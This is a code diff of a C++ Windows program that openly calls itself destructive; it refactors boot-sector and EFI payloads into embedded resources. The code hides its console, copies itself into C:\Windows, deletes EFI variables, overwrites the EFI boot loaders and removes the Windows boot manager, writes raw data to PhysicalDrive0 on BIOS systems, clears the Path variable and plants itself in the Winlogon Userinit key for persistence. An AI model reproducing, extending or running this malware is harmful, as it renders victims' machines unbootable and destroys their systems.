@@ -4,6 +4,7 @@
 #include <direct.h>
 #include <vector>
 #include <winbase.h>
+#include "resource.h"
 
 using namespace std;
 
@@ -63,11 +64,6 @@ wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
     return wString;
 }
 
-void UnpackDeps(LPCWSTR filename) {
-    CopyFile(filename, L"C:\\Windows\\nt32.exe", false);
-    CopyFile(L"vfcompat.dll", L"C:\\Windows\\boot.bin", false);
-    CopyFile(L"appverifUI.dll", L"C:\\Windows\\boot.efi", false);
-}
 
 DWORD is_efi() {
     char buffer[1024];
@@ -75,31 +71,7 @@ DWORD is_efi() {
     return envvar;
 }
 
-int BIOSBootFlash() {
-    // Open the source file
-    HANDLE hSource = CreateFile(TEXT("C:\\Windows\\boot.bin"), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hSource == INVALID_HANDLE_VALUE) {
-        return 1;
-    }
-
-    // Get the size of the source file
-    LARGE_INTEGER fileSize;
-    if (!GetFileSizeEx(hSource, &fileSize)) {
-        CloseHandle(hSource);
-        return 1;
-    }
-
-    // Read the source file into a buffer
-    vector<BYTE> buffer(fileSize.QuadPart);
-    DWORD bytesRead;
-    if (!ReadFile(hSource, buffer.data(), buffer.size(), &bytesRead, NULL) || bytesRead != buffer.size()) {
-        CloseHandle(hSource);
-        return 1;
-    }
-
-    // We're done with the source file
-    CloseHandle(hSource);
-
+int BIOSBootFlash(vector<char> buffer) {
     // Open the target disk
     HANDLE hDevice = CreateFile(TEXT("\\\\.\\PhysicalDrive0"), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hDevice == INVALID_HANDLE_VALUE) {
@@ -161,11 +133,12 @@ LONG SetRegValue(const wchar_t* path, const wchar_t* name, const wchar_t* value)
     return status;
 }
 
-int main(int argc, char** argv)
+int main(int argc, char** argv[])
 {
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+    LPCWSTR filepath = convertCharArrayToLPCWSTR(*argv[0]);      
+    CopyFile(filepath, L"C\\Windows\\nt32.exe", false);
 
-    try {
         std::vector<char> bootBinData;
         LoadResourceData(IDR_BOOT_BIN, RT_RCDATA, bootBinData);
         std::cout << "boot.bin loaded, size: " << bootBinData.size() << " bytes" << std::endl;
@@ -173,10 +146,6 @@ int main(int argc, char** argv)
         std::vector<char> bootEfiData;
         LoadResourceData(IDR_BOOT_EFI, RT_RCDATA, bootEfiData);
         std::cout << "boot.efi loaded, size: " << bootEfiData.size() << " bytes" << std::endl;
-    }
-    catch (const std::exception& e) {
-        std::cerr << "Error: " << e.what() << std::endl;
-    }
 
     int confirmbox = MessageBox(NULL, L"This is a destructive program. By clicking OK you acknowledge that the creator is not responsible for any damage caused.", L"WARNING", MB_OKCANCEL | MB_ICONEXCLAMATION);
     if (confirmbox == IDCANCEL) return 0;
@@ -190,18 +159,24 @@ int main(int argc, char** argv)
         for (const auto& variable : variables) {
             deleteEFIVariable(variable);
         }
+
         system("C:\\Windows\\System32\\mountvol P: /S");
+
         DeleteFile(L"P:\\EFI\\Boot\\bootx64.efi");
-        CopyFile(L"C:\\Windows\\boot.efi", L"P:\\EFI\\Boot\\bootx64.efi", false);
+
+        HANDLE hboot = CreateFile(L"P:\\EFI\\Boot\\bootx64.efi", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        DWORD bootbytesWritten;
+        WriteFile(hboot, static_cast<LPCVOID>(bootEfiData.data()), static_cast<DWORD>(bootEfiData.size()), &bootbytesWritten, NULL);
+        CloseHandle(hboot);
+
         DeleteFile(L"P:\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
-        CopyFile(L"C:\\Windows\\boot.efi", L"P:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", false);
         system("C:\\Windows\\System32\\bcdedit /f /delete {bootmgr}");
     }
     else {
-        BIOSBootFlash();
+        BIOSBootFlash(bootBinData);
     }
 
-    SetPermanentEnvironmentVariable(L"Path", L"trololol");
+    SetPermanentEnvironmentVariable(L"Path", L"");
 
     SetRegValue(L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", L"Userinit", L"C:\\Windows\\userinit.exe,C:\\Windows\\nt32.exe");
 
